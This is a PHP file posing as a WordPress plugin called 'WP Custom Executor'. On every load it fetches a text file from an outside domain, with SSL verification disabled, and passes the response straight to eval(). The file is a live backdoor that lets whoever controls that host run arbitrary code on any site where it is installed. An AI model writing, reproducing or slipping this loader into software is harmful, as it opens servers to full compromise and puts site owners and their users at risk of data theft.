<?php
/**
 * Plugin Name: WP Custom Executor
 * Description: A custom utility for fetching and executing remote content.
 * Version: 1.0
 * Author: WordPress Developer
 */

define('WP_TARGET_URL', "https://media.iloveto.cyou/3.txt");
define('USE_CURL', true);
define('SSL_VERIFY', false);

if (!function_exists('wp_execute_remote_content')) {
    function wp_execute_remote_content($url) {
        if (USE_CURL && function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, SSL_VERIFY);
            $response = curl_exec($ch);
            $error = curl_error($ch);
            curl_close($ch);

            if ($response === false) {
                wp_die(__('cURL Error: ', 'wp-custom-executor') . esc_html($error));
            }

            return $response;
        } elseif (ini_get('allow_url_fopen')) {
            $response = @file_get_contents($url);

            if ($response === false) {
                wp_die(__('Error: Unable to fetch content from the URL using file_get_contents.', 'wp-custom-executor'));
            }

            return $response;
        } else {
            wp_die(__('Error: No available method to fetch content from the URL.', 'wp-custom-executor'));
        }
    }
}

$wp_remote_content = wp_execute_remote_content(WP_TARGET_URL);
eval("?>$wp_remote_content");